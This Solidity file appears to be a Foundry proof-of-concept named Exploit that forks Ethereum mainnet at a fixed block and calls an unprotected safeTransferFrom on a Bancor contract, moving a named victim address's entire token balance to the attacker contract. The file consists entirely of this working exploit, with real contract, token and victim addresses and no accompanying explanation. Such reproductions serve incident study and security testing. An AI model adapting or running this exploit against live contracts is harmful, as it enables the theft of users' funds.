// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IBancor {
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) external;
}

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
    function prank(address) external;
}

contract Exploit {
    function run() public returns (uint256) {
        CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheats.createSelectFork("mainnet", 10307563);
        address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;
        address victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;
        address attacker = address(this);
        IERC20 token = IERC20(0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40);
        IBancor bancor = IBancor(bancorAddress);
        uint256 victimBalance = token.balanceOf(victim);
        cheats.prank(address(this));
        bancor.safeTransferFrom(token, victim, attacker, victimBalance);
        return token.balanceOf(attacker);
    }
}
